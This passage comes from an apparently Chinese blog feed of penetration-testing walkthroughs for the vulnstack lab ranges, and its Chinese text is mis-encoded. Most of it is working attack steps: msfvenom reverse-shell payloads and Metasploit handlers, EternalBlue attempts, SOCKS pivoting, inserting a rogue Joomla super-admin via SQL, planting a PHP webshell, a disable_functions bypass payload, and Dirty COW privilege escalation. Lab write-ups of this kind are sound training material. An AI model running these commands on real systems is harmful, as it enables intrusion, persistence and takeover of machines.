<h4 id="ä¸Šçº¿msf-1"><a href="#ä¸Šçº¿msf-1" class="headerlink" title="ä¸Šçº¿msf"></a>ä¸Šçº¿msf</h4><p>ç„¶ååœ¨msfç”Ÿæˆæœ¨é©¬ï¼Œä½¿ç”¨pythonå¼€å¯gttpæœåŠ¡ï¼Œä¸‹è½½åè¿æ¥shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.128 LPORT&#x3D;8888 -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/msf_shell2.png"></p>
<p><code>use exploit/multi/handler </code></p>
<p> <code>set payload  linux/x86/meterpreter/reverse_tcp</code></p>
<p>çªç„¶ä¸å°å¿ƒæŠŠshell.elfæ–­æ‰äº† é‡æ–°ä¸Šçº¿äº†ä¸€ä¸ª session 12</p>
<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/e94e95f1/autoroute.png"></p>
<p><code>route print</code>æŸ¥çœ‹è·¯ç”±</p>
<p><img src="/posts/e94e95f1/route_print.png"></p>
<h4 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><img src="/posts/e94e95f1/set_socks_proxy.png"></p>
<p><code>sudo /etc/proxychains4.conf</code></p>
<p>ä¿®æ”¹kali proxychains4.confé…ç½®ä¸º<code>socks5 127.0.0.1 1080</code> </p>
<br>

<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><p>ä½¿ç”¨smbæ‰«æ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_version</span><br><span class="line">set rhosts 192.168.183.0&#x2F;24&#96;</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>æ‰«åˆ°ä¸¤å°windowsæœºå™¨</p>
<p><img src="/posts/e94e95f1/smb_scan1.png"></p>
<p><img src="/posts/e94e95f1/smb_scan2.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">192.168.183.130   win2008</span><br><span class="line">192.168.183.148   win7</span><br></pre></td></tr></table></figure>

<p>ç”¨ms17-010æ‰«ä¸€ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set rhosts 192.168.183.130,148</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/posts/e94e95f1/smb_ms17_010.png"></p>
<p>ä¸¤å°æœºå™¨éƒ½å­˜åœ¨ms17-010æ¼æ´</p>
<p>ä½¿ç”¨ms17-010è¿›è¡Œæ”»å‡»</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br><span class="line">setg proxies socks5:127.0.0.1:1080</span><br><span class="line">set rhosts 192.168.183.148</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 4444</span><br><span class="line">set autorunscript post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>ä¸¤å°æœºå™¨éƒ½æ²¡æ‰“é€šâ€¦â€¦</p>
<p><img src="/posts/e94e95f1/ms17010_fail.png"></p>
]]></content>
      <categories>
        <category>vulnstack</category>
      </categories>
      <tags>
        <tag>vulnstack</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnstack3é¶åœº</title>
    <url>/posts/2ce9ab7f/</url>
    <content><![CDATA[<h3 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h3><p>è®¾ç½®VM2 ç½‘æ®µä¸º 192.168.93.0/24 éœ€è¦é‡å¯ä¸€äº›centosçš„ç½‘å¡<code>service network restart</code></p>
<blockquote>
<p>web-centos     192.168.3.40ï¼ˆè¿™é‡Œçš„ipç»å¸¸ä¼šå˜åŒ–ï¼‰        192.168.93.100<br>web-ubuntu    192.168.93.120<br>win2008<br>win2012<br>win7</p>
</blockquote>
<p><img src="/posts/2ce9ab7f/tuopu.png"></p>
<h3 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h3><h4 id="nmapç«¯å£æ‰«æ"><a href="#nmapç«¯å£æ‰«æ" class="headerlink" title="nmapç«¯å£æ‰«æ"></a>nmapç«¯å£æ‰«æ</h4><p><code>sudo nmap 192.168.3.40 -sV</code></p>
<blockquote>
<p>kali@kali2020:~/Tools$ sudo nmap 192.168.3.40 -sV<br>[sudo] kali çš„å¯†ç ï¼š<br>Starting Nmap 7.91 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2021-07-25 16:15 CST<br>Nmap scan report for 192.168.3.40<br>Host is up (0.0082s latency).<br>Not shown: 995 filtered ports<br>PORT     STATE SERVICE    VERSION<br>22/tcp   open  ssh        OpenSSH 5.3 (protocol 2.0)<br>25/tcp   open  tcpwrapped<br>80/tcp   open  http       nginx 1.9.4<br>110/tcp  open  tcpwrapped<br>3306/tcp open  mysql      MySQL 5.7.27-0ubuntu0.16.04.1</p>
<p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</p>
</blockquote>
<h4 id="ç›®å½•æ‰«æ"><a href="#ç›®å½•æ‰«æ" class="headerlink" title="ç›®å½•æ‰«æ"></a>ç›®å½•æ‰«æ</h4><p>ä½¿ç”¨dirmapæ‰«æ</p>
<p><code>sudo python3 dirmap.py -i 192.168.3.40 -lcf</code></p>
<p><img src="/posts/2ce9ab7f/dirmap_output.png"></p>
<p>ä½¿ç”¨dirsearchæ‰«æ</p>
<p><code>sudo python3  dirsearch.py -u http://192.168.3.40 -e */</code></p>
<p><img src="/posts/2ce9ab7f/dirsearch_output.png"></p>
<p>å¾—åˆ°å‡ ä¸ªæ•æ„Ÿç›®å½•</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][23.75kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;1.php                  </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][0b] http:&#x2F;&#x2F;192.168.3.40&#x2F;2.php                       </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.76kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;          </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][1.76kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;index.php </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;bin&#x2F;                                   </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;cache&#x2F;                                 </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;UTF-8][0b] http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php           </span><br><span class="line">[200][None][1.88kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php~                          </span><br><span class="line">[200][text&#x2F;plain][1.43kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;htaccess.txt                          </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;includes&#x2F;                              </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][3.91kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;index.php               </span><br><span class="line">[200][text&#x2F;plain][6.67kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;LICENSE.txt                           </span><br><span class="line">[200][text&#x2F;html; charset&#x3D;utf-8][2.67kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;index.php&#x2F;login&#x2F;        </span><br><span class="line">[200][text&#x2F;plain][1.71kb] http:&#x2F;&#x2F;192.168.3.40&#x2F;README.txt                            </span><br><span class="line">[200][text&#x2F;plain][392.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;robots.txt                           </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;templates&#x2F;                             </span><br><span class="line">[200][text&#x2F;html][31.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;tmp&#x2F;                                   </span><br><span class="line">[200][text&#x2F;plain][628.00b] http:&#x2F;&#x2F;192.168.3.40&#x2F;web.config.txt     </span><br></pre></td></tr></table></figure>

<p>è®¿é—®1.phpå‘ç°æ˜¯ phpinfoé¡µé¢</p>
<p><img src="/posts/2ce9ab7f/phpinfo.png"></p>
<p>è®¿é—®<code>http://192.168.3.40/configuration.php~</code>åº”è¯¥æ˜¯é…ç½®æ–‡ä»¶çš„å¤‡ä»½</p>
<p>å¾—åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç </p>
<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public $dbtype &#x3D; &#39;mysqli&#39;;</span><br><span class="line">public $host &#x3D; &#39;localhost&#39;;</span><br><span class="line">public $user &#x3D; &#39;testuser&#39;;</span><br><span class="line">public $password &#x3D; &#39;cvcvgjASD!@&#39;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/posts/2ce9ab7f/sql_config.png"></p>
<p>è®¿é—®<code>http://192.168.3.40/administrator/  </code>çœ‹åˆ°æ˜¯Joomla! æ­å»ºçš„ç½‘ç«™ï¼Œå¯ä»¥ä½¿ç”¨<code>joomscan</code></p>
<p><code>sudo perl joomscan.pl -u 192.168.3.40  </code></p>
<br>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“  mysql</span><br><span class="line">        è´¦å·:testuser       å¯†ç :cvcvgjASD!@</span><br><span class="line">æ•æ„Ÿç›®å½•</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;1.php                 phpinfo</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;administrator&#x2F;        åå°ç™»å½•é¡µé¢ï¼Œä½¿ç”¨Joomla</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;configuration.php~    å¤‡ä»½é…ç½®æ–‡ä»¶</span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;robots.txt </span><br><span class="line">        http:&#x2F;&#x2F;192.168.3.40&#x2F;web.config.txt  </span><br><span class="line">æ–‡ä»¶è·¯å¾„  	&#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">å¼€æ”¾ç«¯å£    22ï¼Œ25ï¼Œ80ï¼Œ110ï¼Œ3306</span><br><span class="line">æ“ä½œç³»ç»Ÿ    ubuntu16.04.1</span><br><span class="line">åå°ç®¡ç†    ä½¿ç”¨Joomla3.9.12</span><br><span class="line">PHPç‰ˆæœ¬     7.1.32</span><br><span class="line">Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">User&#x2F;Group	www-data(33)&#x2F;33</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><h4 id="ç™»å½•mysqlåˆ›å»ºç”¨æˆ·"><a href="#ç™»å½•mysqlåˆ›å»ºç”¨æˆ·" class="headerlink" title="ç™»å½•mysqlåˆ›å»ºç”¨æˆ·"></a>ç™»å½•mysqlåˆ›å»ºç”¨æˆ·</h4><p><code>mysql -utestuser -h 192.168.3.40 -p</code></p>
<p><img src="/posts/2ce9ab7f/mysql_conn.png"></p>
<p>æœ‰ä¸¤ä¸ªusersè¡¨ åˆ†åˆ«ä¸º<code>am2zu_users</code>  <code>umnbt_users</code>çœ‹ä¸‹è¿™ä¸¤ä¸ªè¡¨ä¸­æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯åˆ©ç”¨</p>
<p><img src="/posts/2ce9ab7f/select_user1.png"></p>
<p><img src="/posts/2ce9ab7f/select_user2.png"></p>
<p><a href="https://docs.joomla.org/How_do_you_recover_or_reset_your_admin_password%3F/zh-cn">Joomalé€šè¿‡æ•°æ®åº“æ·»åŠ æ–°è¶…çº§ç®¡ç†å‘˜</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;am2zu_users&#96; (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;) VALUES (&#39;Administrator2&#39;, &#39;admin2&#39;, &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW()); </span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;) VALUES (LAST_INSERT_ID(),&#39;8&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_error.png"></p>
<p>åˆ›å»ºå®Œå‘ç°æ— æ³•ç™»å½•ï¼Œé‡æ–°åˆ›å»ºäº†ä¸€ä¸ª <code>admin3</code>  <code>secret</code>æˆåŠŸè¿›å…¥åå°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO &#96;am2zu_users&#96;</span><br><span class="line">   (&#96;name&#96;, &#96;username&#96;, &#96;password&#96;, &#96;params&#96;, &#96;registerDate&#96;, &#96;lastvisitDate&#96;, &#96;lastResetTime&#96;)</span><br><span class="line">VALUES (&#39;Administrator3&#39;, &#39;admin3&#39;,</span><br><span class="line">    &#39;d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199&#39;, &#39;&#39;, NOW(), NOW(), NOW());</span><br><span class="line"></span><br><span class="line">INSERT INTO &#96;am2zu_user_usergroup_map&#96; (&#96;user_id&#96;,&#96;group_id&#96;)</span><br><span class="line">VALUES (LAST_INSERT_ID(),&#39;8&#39;);</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/login_success.png"></p>
<h4 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h4><p>åœ¨Extensionsä¸­é€‰æ‹©Beez3æ¨¡æ¿ï¼Œç„¶åç‚¹å‡»New File åˆ›å»ºä¸€ä¸ªshell.php</p>
<p><img src="/posts/2ce9ab7f/beez3.png"></p>
<p><img src="/posts/2ce9ab7f/create_shell_php.png"></p>
<p><img src="/posts/2ce9ab7f/shell.png"></p>
<p>shell.phpåœ¨templates/beez3ç›®å½•ä¸‹</p>
<p>è®¿é—®éªŒè¯æ˜¯å¦æˆåŠŸä¸Šä¼ shell</p>
<p><img src="/posts/2ce9ab7f/shell_success.png"></p>
<h4 id="disable-functionsç»•è¿‡"><a href="#disable-functionsç»•è¿‡" class="headerlink" title="disable_functionsç»•è¿‡"></a>disable_functionsç»•è¿‡</h4><h5 id="èšå‰‘disable-functionsæ’ä»¶"><a href="#èšå‰‘disable-functionsæ’ä»¶" class="headerlink" title="èšå‰‘disable_functionsæ’ä»¶"></a>èšå‰‘disable_functionsæ’ä»¶</h5><p>ä½¿ç”¨èšå‰‘è¿æ¥shellï¼Œåœ¨æ‰§è¡Œå‘½ä»¤æ—¶ï¼Œä¸è®ºå†™ä»€ä¹ˆéƒ½åªä¼šè¿”å›<code>ret=127</code></p>
<p><img src="/posts/2ce9ab7f/ret_127.png"></p>
<p><img src="/posts/2ce9ab7f/disable_func.png"></p>
<p>ä½¿ç”¨èšå‰‘çš„disable_functionsæ’ä»¶ï¼Œé€‰æ‹©<code>PHP7_GC_UAF</code> æˆåŠŸæ‰§è¡Œå‘½ä»¤</p>
<p><img src="/posts/2ce9ab7f/shell_exec.png"></p>
<h5 id="ä½¿ç”¨LD-PRELOADç»•è¿‡"><a href="#ä½¿ç”¨LD-PRELOADç»•è¿‡" class="headerlink" title="ä½¿ç”¨LD_PRELOADç»•è¿‡"></a>ä½¿ç”¨LD_PRELOADç»•è¿‡</h5><p>å·¥å…·ä¸‹è½½åœ°å€ï¼š<a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
<p>ä½¿ç”¨èšå‰‘ä¸Šä¼  bypass_diablefunc.php å’Œ bypass_diablefunc_x64.so åˆ° /templates/beez3/</p>
<p>è®¿é—®<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php</code></p>
<p>payload:<code>http://192.168.3.41/templates/beez3/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/test&amp;sopath=/var/www/html/templates/beez3/bypass_disablefunc_x64.so</code></p>
<p><img src="/posts/2ce9ab7f/LD_PRELOAD.png"></p>
<h4 id="æ•æ„Ÿä¿¡æ¯æ”¶é›†"><a href="#æ•æ„Ÿä¿¡æ¯æ”¶é›†" class="headerlink" title="æ•æ„Ÿä¿¡æ¯æ”¶é›†"></a>æ•æ„Ÿä¿¡æ¯æ”¶é›†</h4><p><code>ifconfig </code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ens33     Link encap:Ethernet  HWaddr 00:0c:29:ab:32:ac  </span><br><span class="line">          inet addr:192.168.93.120  Bcast:192.168.93.255  Mask:255.255.255.0</span><br><span class="line">          inet6 addr: fe80::20c:29ff:feab:32ac&#x2F;64 Scope:Link</span><br><span class="line">          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1</span><br><span class="line">          RX packets:145075 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:86884 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1000 </span><br><span class="line">          RX bytes:17884352 (17.8 MB)  TX bytes:24388894 (24.3 MB)</span><br><span class="line">lo        Link encap:Local Loopback  </span><br><span class="line">          inet addr:127.0.0.1  Mask:255.0.0.0</span><br><span class="line">          inet6 addr: ::1&#x2F;128 Scope:Host</span><br><span class="line">          UP LOOPBACK RUNNING  MTU:65536  Metric:1</span><br><span class="line">          RX packets:380140 errors:0 dropped:0 overruns:0 frame:0</span><br><span class="line">          TX packets:380140 errors:0 dropped:0 overruns:0 carrier:0</span><br><span class="line">          collisions:0 txqueuelen:1 </span><br><span class="line">          RX bytes:28142732 (28.1 MB)  TX bytes:28142732 (28.1 MB)</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨èšå‰‘è®¿é—®ä¸‹/home å’Œ /tmpæ–‡ä»¶ä¸‹å†…å®¹ ï¼Œå‘ç°/tmp/mysql/test.txtï¼Œå†…å®¹ä¸ºä¸‹:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adduser sswwwuser</span><br><span class="line">passwd wwwuser_123Aqx</span><br></pre></td></tr></table></figure>

<p><code>uname -a </code>æŸ¥çœ‹å†…æ ¸ç‰ˆæœ¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure>

<p><code>cat /etc/passwd</code> æŸ¥çœ‹ç”¨æˆ·</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync</span><br><span class="line">games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:100:102:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-network:x:101:103:systemd Network Management,,,:&#x2F;run&#x2F;systemd&#x2F;netif:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-resolve:x:102:104:systemd Resolver,,,:&#x2F;run&#x2F;systemd&#x2F;resolve:&#x2F;bin&#x2F;false</span><br><span class="line">systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:&#x2F;run&#x2F;systemd:&#x2F;bin&#x2F;false</span><br><span class="line">syslog:x:104:108::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">lxd:x:106:65534::&#x2F;var&#x2F;lib&#x2F;lxd&#x2F;:&#x2F;bin&#x2F;false</span><br><span class="line">messagebus:x:107:111::&#x2F;var&#x2F;run&#x2F;dbus:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:108:112::&#x2F;run&#x2F;uuidd:&#x2F;bin&#x2F;false</span><br><span class="line">dnsmasq:x:109:65534:dnsmasq,,,:&#x2F;var&#x2F;lib&#x2F;misc:&#x2F;bin&#x2F;false</span><br><span class="line">yy:x:1000:1000:yy,,,:&#x2F;home&#x2F;yy:&#x2F;bin&#x2F;bash</span><br><span class="line">sshd:x:110:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:111:117:MySQL Server,,,:&#x2F;nonexistent:&#x2F;bin&#x2F;false</span><br><span class="line">www:x:1001:1001::&#x2F;home&#x2F;www:&#x2F;sbin&#x2F;nologin</span><br></pre></td></tr></table></figure>

<p><code>netstat -ano</code> æŸ¥çœ‹å¼€æ”¾ç«¯å£ï¼Œçœ‹åˆ°å¼€æ”¾äº†22 80å’Œ3306</p>
<p>å°è¯•åˆšæ‰åœ¨tmpä¸­æ‰¾åˆ°çš„è´¦å·ç™»å½•sshï¼ŒæˆåŠŸç™»å½•</p>
<p><code>ssh wwwuser@192.168.3.42 -p 22</code>  <code>wwwuser_123Aqx</code></p>
<p><img src="/posts/2ce9ab7f/ssh_login.png"></p>
<p>æŸ¥çœ‹ipæ—¶å‘ç°å’Œèšå‰‘shellä¸Šçš„ipä¸åŒï¼Œæ˜¯å¦ä¸€å°æœºå™¨ï¼Œåº”è¯¥ä½¿ç”¨åˆ°çš„æ˜¯nginxåå‘ä»£ç†</p>
<h4 id="è„ç‰›ææƒ"><a href="#è„ç‰›ææƒ" class="headerlink" title="è„ç‰›ææƒ"></a>è„ç‰›ææƒ</h4><p>ä½¿ç”¨è„ç‰›ææƒ</p>
<p>ä¸‹è½½åœ°å€:<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
<p>å°†dirty.cä¸Šä¼ åˆ°èšå‰‘ ä½¿ç”¨wgetä¸‹è½½</p>
<p><img src="/posts/2ce9ab7f/wget_dirtyc.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line"></span><br><span class="line">.&#x2F;dirty test123</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/dirtycow.png"></p>
<p>æˆåŠŸææƒä¸ºfirefartæƒé™</p>
<h3 id="å†…ç½‘æ¸—é€"><a href="#å†…ç½‘æ¸—é€" class="headerlink" title="å†…ç½‘æ¸—é€"></a>å†…ç½‘æ¸—é€</h3><h4 id="ä¸Šçº¿MSF"><a href="#ä¸Šçº¿MSF" class="headerlink" title="ä¸Šçº¿MSF"></a>ä¸Šçº¿MSF</h4><p>ä½¿ç”¨exploit/multi/script/web_delivery</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">set target 7    # é€‰æ‹©ç›®æ ‡ç³»ç»Ÿ å¯ä»¥show targets æŸ¥çœ‹ 7æ˜¯linux</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.3.43  # kaliçš„ip</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>

<p><img src="/posts/2ce9ab7f/msf_web_delivery.png"><br>å¤åˆ¶payloadåˆ°ç›®æ ‡æœºå™¨è¿è¡Œï¼Œå¾—åˆ°åå¼¹shell<br><img src="/posts/2ce9ab7f/msf_web_delivery2.png"></p>
<hr>
<p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨msfvenomç”Ÿæˆshell</p>
<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.42 LPORT=4444 -f elf &gt; shell.elf</code></p>
<p>ä½¿ç”¨èšå‰‘ä¸Šä¼ ï¼Œç„¶åå†centosæœºå™¨ä¸Šä¸‹è½½shell</p>
<p><code>wget  http://192.168.3.42/templates/beez3/shell.elf</code></p>
<p><code>chmod +x shell.elf</code></p>
<p>åœ¨kaliä¸Šå¼€å¯ç›‘å¬</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf6 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set payload linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lhost kaliçš„ip</span><br><span class="line">lhost &#x3D;&gt; 192.168.3.43</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf6 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure>

<h4 id="æ·»åŠ è·¯ç”±"><a href="#æ·»åŠ è·¯ç”±" class="headerlink" title="æ·»åŠ è·¯ç”±"></a>æ·»åŠ è·¯ç”±</h4><p><code> use post/multi/manage/autoroute</code></p>
<p><img src="/posts/2ce9ab7f/autoroute.png"></p>
<h4 id="è®¾ç½®ä»£ç†"><a href="#è®¾ç½®ä»£ç†" class="headerlink" title="è®¾ç½®ä»£ç†"></a>è®¾ç½®ä»£ç†</h4><p><code>use auxiliary/server/socks_proxy</code></p>
<p><code>sudo vim /etc.proxychains4.conf</code> ä¿®æ”¹ä¸º socks 127.0.0.1</p>
